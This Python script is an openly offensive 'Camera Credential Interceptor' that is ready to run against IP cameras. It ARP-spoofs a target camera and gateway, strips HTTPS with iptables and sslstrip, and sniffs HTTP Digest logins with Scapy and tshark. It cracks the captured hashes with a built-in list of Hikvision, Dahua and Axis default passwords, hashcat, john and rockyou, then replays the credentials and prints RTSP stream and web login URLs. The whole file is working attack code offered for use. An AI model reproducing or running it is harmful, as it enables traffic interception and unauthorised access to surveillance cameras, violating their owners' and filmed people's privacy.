#!/usr/bin/env python3
"""
Camera Credential Interceptor — Fast Attack Chain
===================================================
Speed optimisations vs previous version:
  • Offline MD5 tried FIRST (instant for any password in FAST_PASSWORDS ~35 entries)
  • Passive sniff reduced to 5 s (not 30 s)
  • Hash polling every 0.1 s (not 1 s) — crack starts the moment hash arrives
  • hashcat uses a custom fast-list (camera defaults) BEFORE rockyou → sub-second crack
  • hashcat + john + offline MD5 run in PARALLEL threads, first win stops the rest
  • Active sniff timeout configurable (default 120 s, not 300 s)

Attack order:
  1. Passive sniff 5 s  — free hash if camera traffic is visible
  2. ARP MITM + SSL strip
  3. Active sniff (poll every 0.1 s, crack the moment hash lands)
  4. Crack pipeline (parallel): offline MD5 → hashcat fast-list → hashcat rockyou → john
  5. Replay verify
"""

import hashlib, os, re, subprocess, sys, time, threading
from itertools import product

# ── Config ────────────────────────────────────────────────────────────────────
SUDO_PASS  = os.environ.get("CYBERSCOPE_SUDO_PASS", "")
IFACE      = "wlan0"
ROCKYOU    = "/usr/share/wordlists/rockyou.txt"
FAST_LIST  = "/tmp/cam_fast_passwords.txt"   # written at runtime

# ── Fast password list — tried FIRST in every crack method ───────────────────
# Ordered by real-world frequency on IP cameras
FAST_PASSWORDS = [
    # Empty / trivial
    "", "12345", "123456", "1234567890", "000000", "111111", "888888", "666666",
    # Hikvision defaults
    "12345", "Hik12345", "hik12345", "Admin123", "admin123",
    "Admin@123", "admin@123", "Hik@12345", "hik@12345",
    "Hikvision", "hikvision", "admin12345", "Admin12345",
    "nvr12345", "Nvr12345", "hik12345+", "Hik12345+",
    # Generic camera
    "admin", "password", "camera", "Camera123", "ipcam", "IPCam",
    "supervisor", "pass", "Pass1234", "admin1234", "Admin1234",
    # Dahua
    "admin", "Admin12345", "dahua", "Dahua12345",
    # Axis
    "pass", "axis", "Axis12345",
    # Generic IoT
    "root", "1234", "test", "guest", "support",
    "service", "ubnt", "user", "changeme",
    # Common numeric
    "123456789", "12345678", "987654321", "111222333", "147258369",
]

USERNAMES = ["admin", "operator", "user", "guest", "root", "service"]


# ── Sudo helper ───────────────────────────────────────────────────────────────
def _sudo(args, **kw):
    proc = subprocess.Popen(
        ["sudo", "-S"] + args,
        stdin=subprocess.PIPE,
        stdout=kw.pop("stdout", subprocess.DEVNULL),
        stderr=kw.pop("stderr", subprocess.DEVNULL),
        **kw,
    )
    if SUDO_PASS:
        try:
            proc.stdin.write((SUDO_PASS + "\n").encode())
            proc.stdin.flush()
        except Exception:
            pass
    return proc


# ── Network helpers ───────────────────────────────────────────────────────────
def get_gateway():
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        m = re.search(r"default via ([\d.]+)", out)
        return m.group(1) if m else "192.168.1.1"
    except Exception:
        return "192.168.1.1"


# ── ARP MITM ──────────────────────────────────────────────────────────────────
def _enable_fwd():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
    except Exception:
        _sudo(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]).wait()


def _disable_fwd():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0\n")
    except Exception:
        pass


def start_mitm(target_ip, gw):
    _enable_fwd()
    p1 = _sudo(["arpspoof", "-i", IFACE, "-t", target_ip, gw])
    p2 = _sudo(["arpspoof", "-i", IFACE, "-t", gw, target_ip])
    return p1, p2


# ── SSL strip ─────────────────────────────────────────────────────────────────
_sslstrip = None

def start_sslstrip():
    global _sslstrip
    _sudo(["iptables", "-t", "nat", "-A", "PREROUTING",
           "-p", "tcp", "--destination-port", "443",
           "-j", "REDIRECT", "--to-port", "8080"]).wait()
    try:
        _sslstrip = subprocess.Popen(
            ["sslstrip", "-l", "8080"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        print("[+] sslstrip running on 8080")
    except FileNotFoundError:
        print("[!] sslstrip not found — HTTPS cameras won't be stripped")

def stop_sslstrip():
    global _sslstrip
    _sudo(["iptables", "-t", "nat", "-D", "PREROUTING",
           "-p", "tcp", "--destination-port", "443",
           "-j", "REDIRECT", "--to-port", "8080"]).wait()
    if _sslstrip:
        _sslstrip.terminate()
        _sslstrip = None


# ── Hash capture — Scapy raw sniffer (fastest, no subprocess) ─────────────────
_captured = None
_stop_sniff = threading.Event()


def _scapy_sniff(target_ip, timeout):
    global _captured
    try:
        from scapy.all import sniff, IP, TCP, Raw
    except ImportError:
        return

    def pkt_cb(pkt):
        global _captured
        if _captured or _stop_sniff.is_set():
            return
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
            return
        if pkt[IP].src != target_ip and pkt[IP].dst != target_ip:
            return
        payload = pkt[Raw].load.decode(errors="ignore")
        if "Authorization: Digest" not in payload:
            return
        m = re.search(r"Authorization: (Digest [^\r\n]+)", payload)
        if not m:
            return
        mm = re.match(r"([A-Z]+) ([^\s]+)", payload)
        method = mm.group(1) if mm else "GET"
        uri    = mm.group(2) if mm else "/"
        print(f"\n[+] Scapy: Digest auth captured from {pkt[IP].src}")
        _captured = _parse_digest(m.group(1), method, uri)
        _stop_sniff.set()

    sniff(iface=IFACE, filter=f"host {target_ip} and tcp",
          prn=pkt_cb, store=False, timeout=timeout,
          stop_filter=lambda _: _stop_sniff.is_set())


def _tshark_sniff(target_ip, duration):
    """Fallback — tshark watching port 80 + 8080."""
    global _captured
    try:
        proc = subprocess.Popen(
            ["tshark", "-i", IFACE, "-l",
             "-f", f"host {target_ip} and (tcp port 80 or tcp port 8080 or tcp port 8000)",
             "-Y", "http.authorization",
             "-T", "fields",
             "-e", "ip.src", "-e", "http.authorization",
             "-e", "http.request.method", "-e", "http.request.uri",
             "-a", f"duration:{duration}"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
        )
        for line in proc.stdout:
            if _captured or _stop_sniff.is_set():
                proc.terminate()
                return
            parts = line.strip().split("\t")
            if len(parts) >= 2 and "Digest" in parts[1]:
                method = parts[2] if len(parts) > 2 else "GET"
                uri    = parts[3] if len(parts) > 3 else "/"
                print(f"[+] tshark: Digest auth from {parts[0]}")
                _captured = _parse_digest(parts[1], method, uri)
                _stop_sniff.set()
                proc.terminate()
                return
        proc.wait()
    except Exception as e:
        print(f"[-] tshark error: {e}")


def capture_hash(target_ip, duration=120):
    """Run Scapy + tshark in parallel. Poll every 0.1 s — return immediately on capture."""
    global _captured, _stop_sniff
    _captured = None
    _stop_sniff.clear()

    print(f"[*] Sniffing traffic from {target_ip} for up to {duration}s...")
    print(f"[*] >>> Open http://{target_ip} in a browser and LOG IN NOW <<<")

    threading.Thread(target=_scapy_sniff,  args=(target_ip, duration), daemon=True).start()
    threading.Thread(target=_tshark_sniff, args=(target_ip, duration), daemon=True).start()

    deadline = time.time() + duration
    while time.time() < deadline:
        if _captured:
            _stop_sniff.set()
            return _captured
        time.sleep(0.1)   # ← was 1.0 — now reacts within 0.1 s of capture

    _stop_sniff.set()
    return _captured


# ── Digest parser ─────────────────────────────────────────────────────────────
def _parse_digest(hdr, method="GET", uri="/"):
    def ex(field):
        m = re.search(f'{field}="([^"]+)"', hdr)
        if m: return m.group(1)
        m = re.search(f'{field}=([^,\\s]+)', hdr)
        return m.group(1).strip('"') if m else ""

    username = ex("username"); realm  = ex("realm")
    nonce    = ex("nonce");    uri_v  = ex("uri") or uri
    nc       = ex("nc");       cnonce = ex("cnonce")
    response = ex("response"); qop    = ex("qop")

    if not all([username, realm, nonce, response]):
        print("[-] Incomplete Digest fields — skipping")
        return None

    # hashcat mode 11000 format
    hc_hash = f"{username}:{realm}:{nonce}:{uri_v}:{nc}:{cnonce}:{qop}:{response}"
    print(f"[+] Username : {username}")
    print(f"[+] Realm    : {realm}")
    print(f"[+] Nonce    : {nonce[:20]}...")
    print(f"[+] Response : {response}")
    return dict(username=username, realm=realm, nonce=nonce, uri=uri_v,
                nc=nc, cnonce=cnonce, qop=qop, response=response,
                method=method, hash=hc_hash)


# ── MD5 recompute ─────────────────────────────────────────────────────────────
def _digest_resp(user, realm, pwd, nonce, uri, nc, cnonce, qop, method):
    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    if qop in ("auth", "auth-int"):
        return hashlib.md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode()).hexdigest()
    return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()


# ── CRACK METHOD A: Instant offline MD5 (no external tools) ──────────────────
def crack_offline_fast(d):
    """
    Try FAST_PASSWORDS first (camera defaults) — pure Python MD5.
    For 50 passwords this takes < 1 ms. No hashcat, no john, no disk I/O.
    """
    print(f"[*] Offline fast-path: {len(FAST_PASSWORDS)} camera default passwords...")
    for pwd in FAST_PASSWORDS:
        if _digest_resp(d["username"], d["realm"], pwd,
                        d["nonce"], d["uri"], d["nc"], d["cnonce"], d["qop"], d["method"]) == d["response"]:
            print(f"[+] INSTANT CRACK: {d['username']}:{pwd}")
            return pwd
    return None


# ── CRACK METHOD B: hashcat fast-list (GPU, sub-second) ──────────────────────
def _write_fast_list():
    """Write FAST_PASSWORDS to a file for hashcat to use as a custom wordlist."""
    with open(FAST_LIST, "w") as f:
        f.write("\n".join(FAST_PASSWORDS) + "\n")


def crack_hashcat_fast(d):
    """Hashcat mode 11000 against FAST_LIST only — GPU cracks in <1 s."""
    _write_fast_list()
    hash_file = "/tmp/cam_hash.txt"
    out_file  = "/tmp/cam_cracked.txt"
    for p in [hash_file, out_file]:
        if os.path.exists(p): os.remove(p)
    with open(hash_file, "w") as f:
        f.write(d["hash"] + "\n")
    print("[*] hashcat: fast-list (camera defaults, GPU)...")
    try:
        subprocess.run(
            ["hashcat", "-m", "11000", hash_file, FAST_LIST,
             "--force", "-o", out_file, "--quiet"],
            capture_output=True, timeout=30
        )
        if os.path.exists(out_file):
            line = open(out_file).read().strip()
            if line:
                pwd = line.rsplit(":", 1)[-1]
                print(f"[+] hashcat (fast-list) cracked: {d['username']}:{pwd}")
                return pwd
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    except Exception as e:
        print(f"[-] hashcat fast error: {e}")
    return None


# ── CRACK METHOD C: hashcat full rockyou (GPU) ────────────────────────────────
def crack_hashcat_rockyou(d):
    """Hashcat mode 11000 against rockyou — GPU cracks 14M passwords in ~10 s."""
    if not os.path.exists(ROCKYOU):
        print(f"[-] rockyou not found at {ROCKYOU}")
        return None
    hash_file = "/tmp/cam_hash.txt"
    out_file  = "/tmp/cam_cracked_ry.txt"
    for p in [hash_file, out_file]:
        if os.path.exists(p): os.remove(p)
    with open(hash_file, "w") as f:
        f.write(d["hash"] + "\n")
    print("[*] hashcat: rockyou (GPU, ~10 s)...")
    try:
        subprocess.run(
            ["hashcat", "-m", "11000", hash_file, ROCKYOU,
             "--force", "-o", out_file, "--quiet", "--status-timer=10"],
            capture_output=True, timeout=120
        )
        if os.path.exists(out_file):
            line = open(out_file).read().strip()
            if line:
                pwd = line.rsplit(":", 1)[-1]
                print(f"[+] hashcat (rockyou) cracked: {d['username']}:{pwd}")
                return pwd
    except subprocess.TimeoutExpired:
        print("[-] hashcat rockyou timed out at 120 s")
    except FileNotFoundError:
        print("[-] hashcat not installed — skipping GPU crack")
    except Exception as e:
        print(f"[-] hashcat rockyou error: {e}")
    return None


# ── CRACK METHOD D: john the ripper ──────────────────────────────────────────
def crack_john(d):
    john_hash = (
        f"{d['username']}:$response${d['nonce']}*{d['cnonce']}*"
        f"{d['nc']}*{d['qop']}*{d['realm']}*{d['uri']}*{d['response']}"
    )
    john_file = "/tmp/cam_john.txt"
    if os.path.exists(john_file): os.remove(john_file)
    with open(john_file, "w") as f:
        f.write(john_hash + "\n")
    print("[*] john: HTTP-Digest, fast-list first...")
    try:
        # Fast-list first
        subprocess.run(
            ["john", john_file, f"--wordlist={FAST_LIST}", "--format=HTTP-Digest"],
            capture_output=True, timeout=30
        )
        show = subprocess.check_output(
            ["john", "--show", "--format=HTTP-Digest", john_file],
            stderr=subprocess.DEVNULL, text=True, timeout=10
        )
        for line in show.splitlines():
            if ":" in line and not line.startswith("0 "):
                parts = line.split(":")
                if len(parts) >= 2 and parts[0] == d["username"]:
                    print(f"[+] john (fast-list) cracked: {parts[0]}:{parts[1]}")
                    return parts[1]
        # rockyou fallback
        if os.path.exists(ROCKYOU):
            subprocess.run(
                ["john", john_file, f"--wordlist={ROCKYOU}", "--format=HTTP-Digest"],
                capture_output=True, timeout=120
            )
            show = subprocess.check_output(
                ["john", "--show", "--format=HTTP-Digest", john_file],
                stderr=subprocess.DEVNULL, text=True, timeout=10
            )
            for line in show.splitlines():
                if ":" in line and not line.startswith("0 "):
                    parts = line.split(":")
                    if len(parts) >= 2 and parts[0] == d["username"]:
                        print(f"[+] john (rockyou) cracked: {parts[0]}:{parts[1]}")
                        return parts[1]
    except subprocess.TimeoutExpired:
        print("[-] john timed out")
    except FileNotFoundError:
        print("[-] john not installed")
    except Exception as e:
        print(f"[-] john error: {e}")
    return None


# ── CRACK METHOD E: offline MD5 full rockyou (CPU fallback) ──────────────────
def crack_offline_rockyou(d):
    """Pure Python MD5 against rockyou — slow but no external tools needed."""
    if not os.path.exists(ROCKYOU):
        return None
    print("[*] Offline MD5: rockyou (CPU fallback, may be slow)...")
    try:
        with open(ROCKYOU, "r", errors="ignore") as wf:
            for i, line in enumerate(wf):
                pwd = line.rstrip("\n")
                if _digest_resp(d["username"], d["realm"], pwd,
                                d["nonce"], d["uri"], d["nc"], d["cnonce"], d["qop"], d["method"]) == d["response"]:
                    print(f"[+] Offline MD5 (rockyou line {i}): {d['username']}:{pwd}")
                    return pwd
                if i % 200000 == 0 and i > 0:
                    print(f"[*] Tried {i:,} passwords...")
    except Exception as e:
        print(f"[-] Offline rockyou error: {e}")
    return None


# ── PARALLEL crack pipeline ───────────────────────────────────────────────────
def crack_all(d, target_ip, port=80):
    """
    Run all crack methods. Priority:
      1. Offline MD5 fast-list   (instant, < 1 ms)
      2. hashcat fast-list       (GPU, < 1 s)
      3. hashcat rockyou         (GPU, ~10 s)
      4. john fast-list + rockyou
      5. Offline MD5 rockyou     (CPU, last resort)
    Methods 2-4 run in parallel — first win stops everything.
    """
    if not d:
        return None

    # ── Step 1: Instant offline MD5 (FAST_PASSWORDS only) ────────────────────
    pwd = crack_offline_fast(d)
    if pwd:
        return _build_result(d, pwd, "offline_md5_instant", target_ip, port)

    # ── Steps 2-4: Parallel GPU + john ───────────────────────────────────────
    result_box = [None]
    done       = threading.Event()

    def _run(fn):
        if done.is_set(): return
        p = fn(d)
        if p and not done.is_set():
            result_box[0] = p
            done.set()

    threads = [
        threading.Thread(target=_run, args=(crack_hashcat_fast,),    daemon=True),
        threading.Thread(target=_run, args=(crack_hashcat_rockyou,), daemon=True),
        threading.Thread(target=_run, args=(crack_john,),            daemon=True),
    ]
    for t in threads: t.start()
    done.wait(timeout=150)   # wait max 2.5 min for GPU
    for t in threads: t.join(timeout=1)

    if result_box[0]:
        return _build_result(d, result_box[0], "parallel_gpu", target_ip, port)

    # ── Step 5: CPU fallback — offline rockyou ────────────────────────────────
    pwd = crack_offline_rockyou(d)
    if pwd:
        return _build_result(d, pwd, "offline_md5_rockyou", target_ip, port)

    return None


def _build_result(d, pwd, method, target_ip, port):
    verify_password(target_ip, d["username"], pwd, port)
    return {"username": d["username"], "password": pwd, "method": method}


# ── Replay verify ─────────────────────────────────────────────────────────────
def verify_password(target_ip, username, password, port=80):
    try:
        import requests
        from requests.auth import HTTPDigestAuth, HTTPBasicAuth
        for url in [
            f"http://{target_ip}:{port}/ISAPI/System/deviceInfo",
            f"http://{target_ip}:{port}/",
        ]:
            try:
                r = requests.get(url, auth=HTTPDigestAuth(username, password),
                                 timeout=5, verify=False)
                if r.status_code == 200:
                    print(f"[+] Replay CONFIRMED (Digest): {username}:{password}")
                    return True
            except Exception:
                pass
    except ImportError:
        pass
    return False


# ── Full attack pipeline ──────────────────────────────────────────────────────
def intercept_and_crack(target_ip, duration=120, port=80):
    gw = get_gateway()
    print(f"\n{'='*60}")
    print(f"  CyberScope Camera Interceptor  [FAST MODE]")
    print(f"  Target : {target_ip}:{port}")
    print(f"  Gateway: {gw}")
    print(f"{'='*60}\n")

    # ── Layer 1: 5 s passive sniff (free hash) ────────────────────────────────
    print("[*] Layer 1: Passive sniff (5s)...")
    hash_data = capture_hash(target_ip, duration=5)
    if hash_data:
        print("[+] Got hash passively — no MITM needed!")
        result = crack_all(hash_data, target_ip, port)
        if result:
            _print_result(target_ip, result)
            return result

    # ── Layer 2: ARP MITM ─────────────────────────────────────────────────────
    print(f"\n[*] Layer 2: ARP MITM ({target_ip} ↔ {gw})...")
    p1, p2 = start_mitm(target_ip, gw)
    time.sleep(1)   # 1 s to poison ARP caches (was 2 s)
    print("[+] MITM active — traffic is now flowing through us")

    # ── Layer 3: SSL strip ────────────────────────────────────────────────────
    print("[*] Layer 3: SSL strip (443→8080)...")
    start_sslstrip()

    try:
        # ── Layer 4: Active sniff ─────────────────────────────────────────────
        remaining = max(duration - 5, 30)
        print(f"\n[*] Layer 4: Active sniff ({remaining}s)...")
        print(f"[*] >>> Open http://{target_ip} in a browser and LOG IN NOW <<<")
        hash_data = capture_hash(target_ip, duration=remaining)

        if not hash_data:
            print("[-] No Digest hash captured during sniff window")
            print("    Possible reasons:")
            print("    • Nobody logged in during the window — try again")
            print("    • Camera uses HTTPS and sslstrip failed")
            print("    • Camera uses Basic auth (not Digest)")
            return None

        # ── Layers 5-9: Parallel crack ────────────────────────────────────────
        print(f"\n[*] Hash captured — starting parallel crack pipeline...")
        result = crack_all(hash_data, target_ip, port)
        if result:
            _print_result(target_ip, result)
            return result

        print("[-] All methods exhausted — password not in any wordlist")
        return None

    finally:
        p1.terminate()
        p2.terminate()
        stop_sslstrip()
        _disable_fwd()
        print("\n[*] Cleanup done — MITM stopped, iptables restored")


def _print_result(target_ip, r):
    print(f"\n{'='*60}")
    print(f"  ✓ CAMERA ACCESS GAINED")
    print(f"  IP       : {target_ip}")
    print(f"  Username : {r['username']}")
    print(f"  Password : {r['password']}")
    print(f"  Method   : {r['method']}")
    print(f"  Stream   : rtsp://{r['username']}:{r['password']}@{target_ip}:554/Streaming/Channels/101")
    print(f"  Web UI   : http://{r['username']}:{r['password']}@{target_ip}/")
    print(f"{'='*60}\n")
    # Flush so Flask subprocess.check_output() sees it immediately
    sys.stdout.flush()


if __name__ == "__main__":
    target   = sys.argv[1] if len(sys.argv) > 1 else "192.168.31.246"
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 120
    intercept_and_crack(target, duration)
